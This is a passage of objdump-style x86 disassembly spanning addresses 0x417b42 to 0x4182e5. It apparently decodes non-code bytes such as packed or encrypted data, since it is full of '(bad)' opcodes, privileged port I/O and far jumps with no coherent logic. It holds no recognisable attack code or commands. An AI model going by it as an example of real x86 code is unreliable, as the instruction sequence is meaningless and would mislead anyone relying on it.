  417b42:	test   DWORD PTR [ebx-0x18bdd7b4],ebp
  417b48:	inc    eax
  417b49:	(bad)  
  417b4b:	jmp    0xb895:0xefbdccb6
  417b52:	jecxz  0x417b9d
  417b54:	aaa    
  417b55:	arpl   WORD PTR [ebx],cx
  417b57:	xchg   ebx,eax
  417b58:	mov    bh,0x1c
  417b5a:	cmp    al,0x50
  417b5d:	ja     0x417b16
  417b5f:	stos   BYTE PTR es:[edi],al
  417b60:	sbb    esp,ebx
  417b62:	scas   al,BYTE PTR es:[edi]
  417b63:	ret    
  417b64:	pop    edi
  417b65:	(bad)  
  417b67:	xlat   BYTE PTR ds:[ebx]
  417b68:	les    ebx,FWORD PTR [bx-0x6782]
  417b6d:	xchg   edx,eax
  417b6e:	xchg   esi,eax
  417b6f:	les    ecx,FWORD PTR [edi+ebp*2+0x5463e5d8]
  417b76:	rcr    BYTE PTR fs:[ebx-0x38],cl
  417b7a:	cmc    
  417b7b:	jns    0x417b34
  417b7d:	and    DWORD PTR [edx+0x63],0xe62966e7
  417b84:	jp     0x417b9d
  417b86:	inc    ecx
  417b87:	setle  BYTE PTR [edi+ebp*2+0x1d1f5876]
  417b8f:	jmp    0x417c07
  417b91:	sub    eax,0x966da976
  417b96:	inc    ecx
  417b97:	mov    ch,BYTE PTR [edi-0x67c75a15]
  417b9d:	sbb    eax,0xc43137e3
  417ba2:	imul   edx
  417ba4:	mov    WORD PTR [ebx*1+0x459b547f],?
  417bab:	inc    edi
  417bac:	mov    al,0xc4
  417bae:	cmc    
  417baf:	dec    eax
  417bb0:	cmp    al,0xb2
  417bb2:	test   dl,ah
  417bb4:	ret    0xd8fd
  417bb7:	cld    
  417bb8:	push   edx
  417bb9:	lods   al,BYTE PTR ds:[esi]
  417bba:	jle    0x417b64
  417bbc:	dec    esp
  417bbd:	pop    ss
  417bbe:	out    dx,al
  417bbf:	jb     0x417c04
  417bc1:	sbb    dl,BYTE PTR [edx-0x1a]
  417bc4:	fldenv [esi]
  417bc6:	inc    ecx
  417bc7:	or     ebx,esi
  417bc9:	rcl    DWORD PTR ds:0x3a6ceee,1
  417bcf:	and    eax,0x113b21e
  417bd4:	out    dx,eax
  417bd5:	jb     0x417bcb
  417bd7:	les    esi,FWORD PTR [ebx+0x56f7388]
  417bdd:	xchg   BYTE PTR [ecx-0x9f5d812],ch
  417be3:	inc    esi
  417be4:	(bad)  
  417be5:	or     DWORD PTR gs:[edi+0x2a],ebx
  417be9:	jp     0x417b9a
  417beb:	clc    
  417bec:	ror    DWORD PTR [eax+edi*8],cl
  417bef:	add    dh,BYTE PTR [edx+0x71e10e14]
  417bf5:	pop    esi
  417bf6:	xlat   BYTE PTR ds:[ebx]
  417bf7:	inc    edx
  417bf8:	das    
  417bf9:	sub    ebp,esp
  417bfb:	and    al,0x39
  417bfd:	mov    ds:0x676f4db3,al
  417c02:	imul   esp,DWORD PTR [ebx+0x41],0xfb51155c
  417c09:	and    cl,ch
  417c0b:	add    dl,BYTE PTR [esi]
  417c0d:	shl    BYTE PTR [esp+eiz*2-0x66],cl
  417c11:	jbe    0x417c3e
  417c13:	arpl   bp,ax
  417c15:	or     al,0xf4
  417c17:	pop    eax
  417c18:	pop    edi
  417c19:	jle    0x417c3c
  417c1b:	or     eax,0x96ef7e28
  417c20:	cmc    
  417c21:	scas   al,BYTE PTR es:[edi]
  417c22:	jno    0x417c13
  417c24:	mov    bl,0xe7
  417c26:	sbb    eax,0xc17dc947
  417c2b:	pop    esi
  417c2c:	cmp    ecx,ebp
  417c2e:	xchg   esi,eax
  417c2f:	pop    edi
  417c30:	js     0x417bef
  417c32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c33:	xchg   BYTE PTR [ebp+0x5f],cl
  417c36:	push   eax
  417c37:	jo     0x417c14
  417c39:	fdivrp st(4),st
  417c3b:	cmc    
  417c3c:	or     dh,BYTE PTR [ecx-0x6e441a3c]
  417c42:	sub    eax,0x3f033e01
  417c47:	and    ecx,esi
  417c49:	popa   
  417c4a:	(bad)  
  417c4b:	stc    
  417c4c:	sub    ebp,DWORD PTR [ebx+0x7d3aa161]
  417c52:	dec    eax
  417c53:	sbb    dh,BYTE PTR [edx]
  417c55:	sub    al,BYTE PTR [ebx]
  417c57:	loopne 0x417c1f
  417c59:	inc    edi
  417c5a:	xchg   BYTE PTR [ebp+0x510ab8b4],bh
  417c60:	pop    edx
  417c61:	call   0x9210c7a0
  417c66:	cdq    
  417c67:	jp     0x417c34
  417c69:	mov    al,ds:0x667aee6e
  417c6e:	push   esi
  417c6f:	jmp    0x43dc5eaa
  417c74:	add    DWORD PTR [ebx+0x35],ebx
  417c77:	in     eax,0xf
  417c79:	int    0xf7
  417c7b:	das    
  417c7c:	xor    eax,0x681f6993
  417c81:	mov    bl,dl
  417c83:	pushf  
  417c84:	mov    DWORD PTR [ecx],ebx
  417c86:	je     0x417c7d
  417c88:	xor    al,0x55
  417c8a:	jg     0x417ca1
  417c8c:	shl    BYTE PTR [esi],0x5
  417c8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c90:	fstp   TBYTE PTR [ecx-0x79411d81]
  417c96:	mov    edi,0xeede24fc
  417c9b:	mov    dl,0xff
  417c9d:	scas   al,BYTE PTR es:[edi]
  417c9e:	push   eax
  417c9f:	ds inc ecx
  417ca1:	arpl   WORD PTR [ecx+0x5c8b5db9],di
  417ca7:	sbb    edi,DWORD PTR [ebx]
  417ca9:	jb     0x417cb0
  417cab:	mov    esi,0xef632fdc
  417cb0:	xchg   ecx,eax
  417cb1:	and    DWORD PTR [edi-0x12],edx
  417cb4:	retf   0xc7a7
  417cb7:	cs in  al,dx
  417cb9:	adc    eax,ecx
  417cbb:	or     eax,DWORD PTR [esi-0x6e4a2d80]
  417cc1:	xor    eax,0xdc00d555
  417cc6:	stc    
  417cc7:	lahf   
  417cc8:	pop    esp
  417cc9:	pusha  
  417cca:	inc    edi
  417ccb:	push   ebp
  417ccc:	mov    ds:0x4991c233,al
  417cd1:	inc    eax
  417cd2:	jmp    0x5fb2:0x6736631a
  417cd9:	scas   al,BYTE PTR es:[edi]
  417cda:	mov    ds:0xd907c8aa,eax
  417cdf:	inc    edx
  417ce0:	pop    edx
  417ce1:	or     edi,DWORD PTR [ebx+0x1a219fc3]
  417ce7:	lahf   
  417ce8:	aad    0x24
  417cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ceb:	mov    dh,0x1e
  417ced:	inc    esi
  417cee:	dec    eax
  417cef:	mov    edi,DWORD PTR [esi+0x9]
  417cf2:	push   esp
  417cf3:	pop    esi
  417cf4:	loopne 0x417d03
  417cf6:	mov    dh,0xe8
  417cf8:	gs jne 0x417d1b
  417cfb:	js     0x417ca1
  417cfd:	push   0x11
  417cff:	shl    BYTE PTR [ecx-0x5a],1
  417d02:	ss xchg ecx,eax
  417d04:	inc    ebp
  417d05:	dec    eax
  417d06:	lods   eax,DWORD PTR ds:[esi]
  417d07:	call   0x7397d4f6
  417d0c:	mov    ch,0x60
  417d0e:	mov    BYTE PTR [edi-0x5caead2f],0xf9
  417d15:	mov    esp,0xbd295102
  417d1a:	cmp    eax,0x5404cb00
  417d1f:	jae    0x417d1a
  417d21:	(bad)  
  417d22:	jne    0x417d55
  417d24:	inc    esi
  417d25:	popa   
  417d26:	push   es
  417d27:	sbb    eax,0xdb05ffcf
  417d2c:	in     al,0x35
  417d2e:	out    0x72,al
  417d30:	clc    
  417d31:	icebp  
  417d32:	scas   al,BYTE PTR es:[edi]
  417d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d34:	daa    
  417d35:	xchg   ebp,eax
  417d36:	call   0x9c21ff59
  417d3b:	cmp    edx,DWORD PTR [eax+esi*8]
  417d3e:	sbb    ah,BYTE PTR [ebx]
  417d40:	mov    esp,0x97ef3d99
  417d45:	into   
  417d46:	aas    
  417d47:	ds jb  0x417d21
  417d4a:	jne    0x417d60
  417d4c:	retf   0x1e4a
  417d4f:	dec    ebx
  417d50:	lahf   
  417d51:	mov    esi,0xa648b36
  417d56:	cwde   
  417d57:	jns    0x417d49
  417d59:	repnz sbb ah,ch
  417d5c:	int    0xe1
  417d5e:	pop    edx
  417d5f:	rol    dh,cl
  417d61:	loopne 0x417ce6
  417d63:	repz push es
  417d65:	hlt    
  417d66:	sbb    BYTE PTR [ebp+0x25],bh
  417d69:	cld    
  417d6a:	mov    edx,DWORD PTR [esp+ebx*1-0x58]
  417d6e:	and    BYTE PTR [edi],bh
  417d70:	push   0x48
  417d72:	push   ds
  417d73:	loope  0x417d1c
  417d75:	ror    BYTE PTR [eax],1
  417d77:	sub    edx,DWORD PTR [ecx]
  417d79:	mov    dh,0x3a
  417d7b:	popa   
  417d7c:	or     eax,0x2d35715a
  417d81:	dec    edi
  417d82:	pop    ebx
  417d83:	jne    0x417df2
  417d85:	aam    0x4c
  417d87:	or     eax,DWORD PTR [edx]
  417d89:	fwait
  417d8a:	dec    edx
  417d8b:	lea    edi,[edi+0x4ed63d3]
  417d91:	and    al,0x2c
  417d93:	or     bh,BYTE PTR [ebx+0x3f9e5827]
  417d99:	pop    ss
  417d9a:	cmp    BYTE PTR [edx+0x781563a],dh
  417da0:	gs cmp eax,0x2a49128b
  417da6:	pop    ss
  417da7:	and    cl,bl
  417da9:	fidivr WORD PTR [ebp+0x43ec05d1]
  417daf:	in     eax,dx
  417db0:	retf   
  417db1:	or     ch,BYTE PTR [esi+eax*4]
  417db4:	mov    ebp,0xe9fc04b9
  417db9:	ins    BYTE PTR es:[edi],dx
  417dba:	pop    eax
  417dbb:	sub    al,0x82
  417dbd:	xchg   ebx,eax
  417dbe:	cld    
  417dbf:	cld    
  417dc0:	mov    dh,0xde
  417dc2:	pop    eax
  417dc3:	sub    eax,0x9ccb8f33
  417dc8:	fld    TBYTE PTR [edx]
  417dca:	mov    bh,0x46
  417dcc:	dec    eax
  417dcd:	fsubr  QWORD PTR [eax-0x11ed3300]
  417dd3:	and    al,ah
  417dd5:	fsubrp st(3),st
  417dd7:	ficomp DWORD PTR [ecx]
  417dd9:	mov    ebp,?
  417ddb:	sub    DWORD PTR [ebp+0x1b],ebx
  417dde:	aas    
  417ddf:	lods   al,BYTE PTR ds:[esi]
  417de0:	mov    al,0xd6
  417de2:	add    cl,BYTE PTR [edi]
  417de4:	xor    al,0x19
  417de6:	bound  edx,QWORD PTR [ebx]
  417de8:	call   0x637fa424
  417ded:	outs   dx,DWORD PTR ds:[esi]
  417dee:	mov    al,ds:0xaecd6634
  417df3:	loop   0x417e05
  417df5:	int    0x44
  417df7:	int    0xaa
  417df9:	lock push ebp
  417dfb:	and    DWORD PTR [ebx+0x67],ebp
  417dfe:	xchg   esp,eax
  417dff:	cwde   
  417e00:	enter  0xead4,0x3c
  417e04:	mov    ah,0x9c
  417e06:	hlt    
  417e07:	jb     0x417e0d
  417e09:	pusha  
  417e0a:	mov    dh,0x19
  417e0c:	add    eax,0x5f54a864
  417e11:	or     BYTE PTR [edx+0x6e161543],al
  417e17:	imul   ebp,DWORD PTR [ecx],0x22
  417e1a:	pushw  0xffaa
  417e1d:	pop    ecx
  417e1e:	unpckhps xmm2,xmm4
  417e21:	fidivr DWORD PTR [ebx+edi*8+0x34e42e6a]
  417e28:	rep outs dx,DWORD PTR ds:[esi]
  417e2a:	adc    al,0x8b
  417e2c:	inc    esp
  417e2d:	inc    ebx
  417e2e:	dec    edi
  417e2f:	es in  al,0xd
  417e32:	xor    eax,0xdc60fda7
  417e37:	lea    ebx,[ecx+0x5f]
  417e3a:	or     esi,DWORD PTR ds:0xaa4fa668
  417e40:	pop    esi
  417e41:	lods   eax,DWORD PTR ds:[esi]
  417e42:	pop    esp
  417e43:	jg     0x417ec2
  417e45:	sbb    al,0xd1
  417e47:	mov    ebx,0x176e331
  417e4c:	push   esp
  417e4d:	in     eax,0xa0
  417e4f:	ins    BYTE PTR es:[edi],dx
  417e50:	adc    al,0x2
  417e52:	push   ds
  417e53:	dec    esp
  417e54:	mov    ecx,ebx
  417e56:	stos   BYTE PTR es:[edi],al
  417e57:	icebp  
  417e58:	mov    al,0x59
  417e5a:	addr16 add eax,0xbc0cd04e
  417e60:	adc    al,0x2d
  417e62:	fiadd  DWORD PTR [edi+eax*2-0x4c]
  417e66:	adc    DWORD PTR es:[ecx+edi*8-0x73],esp
  417e6b:	jmp    0x22f4:0x2b1a689a
  417e72:	mov    edi,0x555d2c1c
  417e77:	push   cs
  417e78:	and    DWORD PTR [ebx],ecx
  417e7a:	not    DWORD PTR [edx]
  417e7c:	or     BYTE PTR [edx+0x2628607c],bl
  417e82:	jle    0x417e1b
  417e84:	jmp    0xb9649d0d
  417e89:	das    
  417e8a:	xchg   ecx,eax
  417e8b:	and    esp,DWORD PTR fs:[esi-0x40]
  417e8f:	fist   DWORD PTR [ecx-0x5dd5fb64]
  417e95:	repnz or dh,BYTE PTR [ebp-0x4a]
  417e99:	mov    cl,BYTE PTR [ebx+0x77162d05]
  417e9f:	imul   edi,DWORD PTR [ebx+0x6c],0xffffffc6
  417ea3:	inc    eax
  417ea4:	outs   dx,BYTE PTR ds:[esi]
  417ea5:	pop    eax
  417ea6:	lods   al,BYTE PTR ds:[esi]
  417ea7:	mov    al,0x8
  417ea9:	aas    
  417eaa:	xchg   ebx,eax
  417eab:	mov    esi,DWORD PTR [ebp+0x28]
  417eae:	popf   
  417eaf:	lods   eax,DWORD PTR ds:[esi]
  417eb0:	lods   eax,DWORD PTR ds:[esi]
  417eb1:	cwde   
  417eb2:	lds    esi,FWORD PTR [ecx]
  417eb4:	pop    esp
  417eb5:	pushf  
  417eb6:	sub    eax,0xd72259bf
  417ebb:	inc    ebp
  417ebc:	or     dl,BYTE PTR [edx]
  417ebe:	mov    ds:0x95e9473a,eax
  417ec3:	sti    
  417ec4:	sbb    eax,0x77c0803
  417ec9:	and    esi,DWORD PTR [eax+0x7817a9d6]
  417ecf:	lods   al,BYTE PTR ds:[esi]
  417ed0:	push   edi
  417ed1:	test   DWORD PTR [edx-0x3b7fb4ee],eax
  417ed7:	jle    0x417edc
  417ed9:	enter  0xa9a8,0xb
  417edd:	int    0xe3
  417edf:	std    
  417ee0:	cmc    
  417ee1:	pop    esi
  417ee2:	sbb    dh,BYTE PTR [ebp-0x76]
  417ee5:	retf   0x7de6
  417ee8:	out    dx,eax
  417ee9:	les    esp,FWORD PTR [esi]
  417eeb:	in     al,dx
  417eec:	idiv   DWORD PTR [edi]
  417eee:	or     BYTE PTR [ecx-0x9],al
  417ef1:	push   ds
  417ef2:	cmp    eax,ebp
  417ef4:	mov    edx,0x3f2bdd05
  417ef9:	push   ebp
  417efa:	das    
  417efb:	jnp    0x417f09
  417efd:	(bad)  
  417efe:	(bad)  
  417f00:	rol    DWORD PTR [ebx-0x5070d808],1
  417f06:	inc    ebp
  417f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f08:	pop    ebp
  417f09:	mov    edi,0x98c46028
  417f0e:	and    BYTE PTR [ebx],bl
  417f10:	or     DWORD PTR [eax],edi
  417f12:	das    
  417f13:	dec    ebp
  417f14:	stos   BYTE PTR es:[edi],al
  417f15:	add    eax,0xbde09bd7
  417f1a:	test   DWORD PTR [edi],edx
  417f1c:	test   BYTE PTR [ebx+0x60],dh
  417f1f:	or     dl,ah
  417f21:	adc    BYTE PTR [ebx+ecx*2-0x90ef15e],al
  417f28:	cli    
  417f29:	pop    eax
  417f2a:	xchg   esi,eax
  417f2b:	enter  0x9fdd,0xd6
  417f2f:	sub    eax,0xbe0ec56b
  417f34:	call   0x1afd:0xb46d9bc9
  417f3b:	pop    ss
  417f3c:	sub    eax,0xd2603104
  417f41:	xchg   esi,eax
  417f42:	jne    0x417ee6
  417f44:	cmp    ebp,DWORD PTR [ecx+0x2fb099b1]
  417f4a:	sahf   
  417f4b:	pop    esp
  417f4c:	and    BYTE PTR [edx+ebp*8-0x22e4127d],0x45
  417f54:	or     eax,0xdc7c8b98
  417f59:	stos   BYTE PTR es:[edi],al
  417f5a:	push   ebp
  417f5b:	in     eax,0x71
  417f5d:	xlat   BYTE PTR ds:[ebx]
  417f5e:	xor    esp,edx
  417f60:	in     al,dx
  417f61:	xchg   esi,eax
  417f62:	and    eax,DWORD PTR [edi]
  417f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f65:	clc    
  417f66:	push   edi
  417f67:	popf   
  417f68:	push   ds
  417f69:	dec    esi
  417f6a:	in     eax,0xd3
  417f6c:	jp     0x417fc7
  417f6e:	mov    ah,0x6e
  417f70:	fdivrp st(3),st
  417f72:	inc    ecx
  417f73:	mov    bh,BYTE PTR [edi+0x5a]
  417f76:	stos   DWORD PTR es:[edi],eax
  417f77:	rol    DWORD PTR [eax-0x4bbcc086],cl
  417f7d:	dec    ecx
  417f7e:	xor    BYTE PTR [ebx+0x2a4ad863],0xa7
  417f85:	xchg   edi,eax
  417f86:	ins    BYTE PTR es:[edi],dx
  417f87:	and    DWORD PTR [ecx+0x10d39f92],esi
  417f8d:	cwde   
  417f8e:	push   esp
  417f8f:	in     eax,0x8d
  417f91:	call   0x4a1a:0x382253a3
  417f98:	(bad)  
  417f99:	push   0x63
  417f9b:	aam    0xa6
  417f9d:	mov    edx,0xd78879db
  417fa2:	and    eax,DWORD PTR [ecx-0x31]
  417fa5:	pop    ecx
  417fa6:	in     eax,0x6a
  417fa8:	mov    cl,0x75
  417faa:	mov    edi,0x83186c79
  417faf:	adc    DWORD PTR [ebp-0x40],edx
  417fb2:	aad    0xd5
  417fb4:	or     bl,al
  417fb6:	aam    0xb9
  417fb8:	sbb    al,0x1a
  417fba:	test   BYTE PTR [edi-0x51],bh
  417fbd:	pushf  
  417fbe:	dec    eax
  417fbf:	mov    al,ds:0x6427f30d
  417fc4:	dec    eax
  417fc5:	gs adc al,0xe5
  417fc8:	and    BYTE PTR [esi+0x48],bh
  417fcb:	adc    ecx,DWORD PTR [edi+0x5e]
  417fce:	ins    DWORD PTR es:[edi],dx
  417fcf:	jae    0x418026
  417fd1:	aaa    
  417fd2:	xor    eax,0x3055e2e2
  417fd7:	int    0x85
  417fd9:	shr    ecx,cl
  417fdb:	add    al,0x5d
  417fdd:	cli    
  417fde:	mov    ds:0x90d9ee9e,al
  417fe3:	mov    eax,ds:0x8f956e3d
  417fe8:	push   eax
  417fe9:	shl    dl,cl
  417feb:	les    ebx,FWORD PTR [edi+0x3fffbd0f]
  417ff1:	jno    0x417f98
  417ff3:	ret    
  417ff4:	loopne 0x417f83
  417ff6:	or     BYTE PTR [edi+edi*8],ch
  417ff9:	push   ss
  417ffa:	xchg   esp,eax
  417ffb:	push   esp
  417ffc:	sbb    DWORD PTR ds:0x8f42f605,ebp
  418002:	mov    ebp,0x98ad97d9
  418007:	fstp   QWORD PTR [ecx]
  418009:	repz add al,0xfa
  41800c:	mov    edi,0xb281f687
  418011:	das    
  418012:	out    dx,eax
  418013:	xchg   edx,eax
  418014:	add    al,dh
  418016:	mov    edi,0x7fde8984
  41801b:	psubq  mm5,mm1
  41801e:	pop    ebp
  41801f:	fdiv   QWORD PTR [esi]
  418021:	in     al,0xe0
  418023:	jnp    0x418070
  418025:	inc    esi
  418026:	loop   0x417fce
  418028:	mov    edi,edx
  41802a:	fmul   DWORD PTR cs:[ecx+0x26677716]
  418031:	out    0x54,eax
  418033:	and    BYTE PTR [esi-0x48],ah
  418036:	xor    al,0x1c
  418038:	mov    ebp,0x273bd6f9
  41803d:	mov    ds:0x7235456c,al
  418042:	cli    
  418043:	lahf   
  418044:	mov    ebx,0x6fe2b418
  418049:	dec    ebp
  41804a:	popf   
  41804b:	mov    esi,0x3aa434df
  418050:	rcl    DWORD PTR [eax],1
  418052:	mov    ah,0x91
  418054:	cmp    eax,0x60a158c0
  418059:	fiadd  DWORD PTR [esi]
  41805b:	addr16 mov al,ds:0xc181
  41805f:	mov    BYTE PTR [eax],bl
  418061:	mov    ch,BYTE PTR [ebp+0x75]
  418064:	loop   0x4180d9
  418066:	les    edi,FWORD PTR [eax+0x46d74792]
  41806c:	xchg   ebx,eax
  41806d:	rcr    bh,cl
  41806f:	jge    0x417ff9
  418071:	mov    dh,0x40
  418073:	push   ecx
  418074:	push   0x39
  418076:	iret   
  418077:	frstor [ebx-0x50661385]
  41807d:	push   ecx
  41807e:	cs jl  0x4180aa
  418081:	inc    edi
  418082:	loop   0x4180f2
  418084:	popa   
  418085:	cli    
  418086:	leave  
  418087:	cmp    esi,DWORD PTR [edi-0x7bd1060f]
  41808d:	leave  
  41808e:	cmp    dl,BYTE PTR [ecx+ecx*2]
  418091:	into   
  418092:	fdivr  DWORD PTR [ebp+0x406cfc6f]
  418098:	outs   dx,DWORD PTR ds:[esi]
  418099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41809a:	mov    dl,0xbc
  41809c:	dec    eax
  41809d:	xchg   esp,eax
  41809e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41809f:	retf   
  4180a0:	jle    0x4180f6
  4180a2:	lock mov ecx,0x6a0b4015
  4180a8:	mov    dh,0xfb
  4180aa:	pusha  
  4180ab:	loop   0x4180ed
  4180ad:	fld    TBYTE PTR [ebx+0x7c]
  4180b0:	push   0xffffffdd
  4180b2:	(bad)  [ecx-0x17df4b55]
  4180b8:	int    0x91
  4180ba:	cmp    DWORD PTR [edx-0x5d3b5ab3],ebx
  4180c0:	sar    esi,cl
  4180c2:	xlat   BYTE PTR ds:[ebx]
  4180c3:	imul   edi,ecx,0xa9b45d4c
  4180c9:	das    
  4180ca:	pusha  
  4180cb:	sub    edx,edx
  4180cd:	xchg   esp,eax
  4180ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180cf:	mov    ebx,0x822fe780
  4180d4:	mov    ah,0x2b
  4180d6:	fwait
  4180d7:	mov    DWORD PTR [ebp+0x33],edx
  4180da:	cdq    
  4180db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180dd:	mov    eax,ds:0x1101ec93
  4180e2:	inc    eax
  4180e3:	push   ss
  4180e4:	mov    WORD PTR [edi],fs
  4180e6:	popa   
  4180e7:	cld    
  4180e8:	gs sbb ebp,edx
  4180eb:	mov    edx,0x438df427
  4180f0:	test   al,0x70
  4180f2:	push   ds
  4180f3:	ins    DWORD PTR es:[edi],dx
  4180f4:	outs   dx,BYTE PTR ds:[esi]
  4180f5:	or     eax,0x5ed709f
  4180fa:	pop    esi
  4180fb:	lds    ebx,FWORD PTR [edi]
  4180fd:	jo     0x418158
  4180ff:	push   0x9d2c0464
  418104:	test   al,0x1a
  418106:	mov    ecx,0xf16a99f7
  41810b:	dec    esi
  41810c:	mov    ebp,0xe27e2eb2
  418111:	or     DWORD PTR [ebp+0x75],edx
  418114:	stos   BYTE PTR es:[edi],al
  418115:	enter  0x459c,0x1b
  418119:	cmp    DWORD PTR [ebp+0x31],esp
  41811c:	jg     0x4180fe
  41811e:	mov    ecx,cs
  418120:	stos   DWORD PTR es:[edi],eax
  418121:	mov    ebx,edx
  418123:	sbb    eax,0xfd47933
  418128:	or     eax,0x6eec1675
  41812d:	mov    dl,0x17
  41812f:	pushf  
  418130:	sahf   
  418131:	and    cl,al
  418133:	mov    esi,0xa591d18f
  418138:	mov    cl,0xc5
  41813a:	icebp  
  41813b:	mov    edx,DWORD PTR [esi-0x71]
  41813e:	ins    BYTE PTR es:[edi],dx
  41813f:	addr16 sbb ch,bl
  418142:	cmp    BYTE PTR [edx],bh
  418144:	into   
  418145:	push   esp
  418146:	icebp  
  418147:	dec    edi
  418148:	call   0xc59f:0xb659b3fc
  41814f:	mov    ds:0x3120b3ce,al
  418154:	fucomi st,st(2)
  418156:	or     al,0xde
  418158:	jne    0x418150
  41815a:	dec    eax
  41815b:	js     0x4181ca
  41815d:	sti    
  41815e:	mov    bl,0xa0
  418160:	mov    ch,0xa2
  418162:	mov    al,ds:0xfbe1580c
  418167:	call   0x267b2722
  41816c:	fbstp  TBYTE PTR [edi-0x378557c6]
  418172:	dec    esi
  418173:	stos   BYTE PTR es:[edi],al
  418174:	std    
  418175:	retf   
  418176:	inc    esp
  418177:	shl    BYTE PTR [eax],1
  418179:	repz xor al,0xbc
  41817c:	bound  edx,QWORD PTR [ecx-0x7944331]
  418182:	dec    ebx
  418183:	jmp    0x1d6c:0xe3359b08
  41818a:	fbstp  TBYTE PTR [edi+eax*2]
  41818d:	pop    ebx
  41818e:	ror    BYTE PTR [ebp-0x27fd72f6],1
  418194:	repz jl 0x4181f9
  418197:	imul   ebp,esp,0xffffffa8
  41819a:	jbe    0x418143
  41819c:	enter  0x645c,0x2d
  4181a0:	inc    ebp
  4181a1:	out    0x44,al
  4181a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181a4:	loope  0x4181df
  4181a6:	mov    eax,0x8186ba15
  4181ab:	ds sbb ah,al
  4181ae:	and    dl,BYTE PTR [edx]
  4181b0:	mov    eax,edx
  4181b2:	imul   edi,eax,0x25
  4181b5:	mov    ecx,0x6cf36e74
  4181ba:	jl     0x418145
  4181bc:	bound  edi,QWORD PTR [edi]
  4181be:	pop    eax
  4181bf:	retf   
  4181c0:	shl    ebp,1
  4181c2:	aaa    
  4181c3:	mov    dh,0xb9
  4181c5:	mov    eax,0x65eb7e9
  4181ca:	mov    ebp,0x6a779cb7
  4181cf:	ss (bad) 
  4181d1:	les    edi,FWORD PTR [esp+ecx*1-0x18]
  4181d5:	adc    dh,BYTE PTR [ecx]
  4181d7:	or     eax,0x6302173f
  4181dc:	cwde   
  4181dd:	cmc    
  4181de:	jp     0x4181fa
  4181e0:	xor    dl,bh
  4181e2:	jb     0x418201
  4181e4:	sbb    cl,dh
  4181e6:	in     al,dx
  4181e7:	rol    DWORD PTR [ecx-0x4],1
  4181ea:	cdq    
  4181eb:	into   
  4181ec:	push   es
  4181ed:	xchg   BYTE PTR [edx+eiz*4-0x18],dl
  4181f1:	std    
  4181f2:	out    0x7a,eax
  4181f4:	jecxz  0x418216
  4181f6:	sbb    eax,esi
  4181f8:	inc    ecx
  4181f9:	mov    bl,0x3e
  4181fb:	idiv   al
  4181fd:	ins    DWORD PTR es:[edi],dx
  4181fe:	stos   BYTE PTR es:[edi],al
  4181ff:	ins    DWORD PTR es:[edi],dx
  418200:	mov    WORD PTR ds:0x51df480f,ds
  418206:	(bad)  
  418207:	mov    eax,0xb518a2be
  41820c:	sub    edi,eax
  41820e:	inc    ebp
  41820f:	inc    ecx
  418210:	and    BYTE PTR [ecx+eax*1-0x60],al
  418214:	in     al,0xf3
  418216:	(bad)  
  418217:	fdivr  st(1),st
  418219:	loope  0x418236
  41821b:	sbb    al,0x5c
  41821d:	pushf  
  41821e:	jmp    0x418297
  418220:	fisttp DWORD PTR cs:[eax+0xa]
  418224:	jno    0x41826b
  418226:	(bad)  
  418228:	push   esi
  418229:	mov    gs,WORD PTR ds:0x619c8580
  41822f:	adc    ebx,0xffffff90
  418232:	lods   al,BYTE PTR ds:[esi]
  418233:	aam    0x3a
  418235:	adc    eax,0xa7306a4a
  41823a:	mov    esi,0xd4d21d
  41823f:	popf   
  418240:	(bad)  
  418241:	mov    edi,0x1bd95c3c
  418246:	stos   DWORD PTR es:[edi],eax
  418247:	mov    al,BYTE PTR [edi+0x59818fa0]
  41824d:	mov    ?,WORD PTR [edi-0x5e]
  418250:	mov    edx,0x967fa646
  418255:	pop    esi
  418256:	push   esi
  418257:	rcl    BYTE PTR [edx-0x15],1
  41825a:	inc    edx
  41825b:	mov    dh,0xe4
  41825d:	ins    BYTE PTR es:[edi],dx
  41825e:	pop    ecx
  41825f:	mov    gs,WORD PTR [esi-0x5e875190]
  418265:	xchg   edi,eax
  418266:	pop    ebp
  418267:	pop    edx
  418268:	push   ss
  418269:	mov    ebx,0x1f4b0159
  41826e:	sub    DWORD PTR [edi-0x1e],edi
  418271:	pop    es
  418272:	aad    0x3b
  418274:	jecxz  0x4182ec
  418276:	pushf  
  418277:	or     ah,dl
  418279:	mov    dl,0x82
  41827b:	inc    edi
  41827c:	dec    ebx
  41827d:	rcr    DWORD PTR [ebp+0x67],cl
  418280:	push   ebx
  418281:	or     al,0xdb
  418283:	adc    ecx,ebx
  418285:	clc    
  418286:	call   FWORD PTR [edi-0x2526440d]
  41828c:	daa    
  41828d:	or     bh,BYTE PTR [eax]
  41828f:	test   DWORD PTR [ecx+ecx*8-0x4a],ebx
  418293:	data16 hlt 
  418295:	jl     0x3203b85
  41829b:	adc    dh,BYTE PTR [ecx]
  41829d:	sar    BYTE PTR [ebx-0x5bceecfb],cl
  4182a3:	mov    al,ds:0x743649ca
  4182a8:	(bad)  
  4182a9:	fiadd  WORD PTR [ebp+ebp*1+0x3c]
  4182ad:	ret    
  4182ae:	sbb    ch,BYTE PTR [edx]
  4182b0:	dec    edi
  4182b1:	jne    0x4182f1
  4182b3:	stos   DWORD PTR es:[edi],eax
  4182b4:	fadd   DWORD PTR [edx+0x46]
  4182b7:	pop    ebx
  4182b8:	jns    0x418272
  4182ba:	jae    0x418336
  4182bc:	cli    
  4182bd:	mov    cl,0xc0
  4182bf:	(bad)  [ebx-0x68]
  4182c2:	push   edi
  4182c3:	mov    eax,0xf9756b19
  4182c8:	sbb    DWORD PTR ds:0x98a7f4f9,edi
  4182ce:	push   ss
  4182cf:	ret    0xbbb4
  4182d2:	(bad)
  4182d5:	into   
  4182d6:	mov    DWORD PTR [ecx+eiz*4-0x4d],ecx
  4182da:	add    bh,bh
  4182dc:	adc    eax,0x1e725bf8
  4182e1:	jmp    0x4182d3
  4182e3:	jg     0x418308
  4182e5:	push   0x7cc4562e
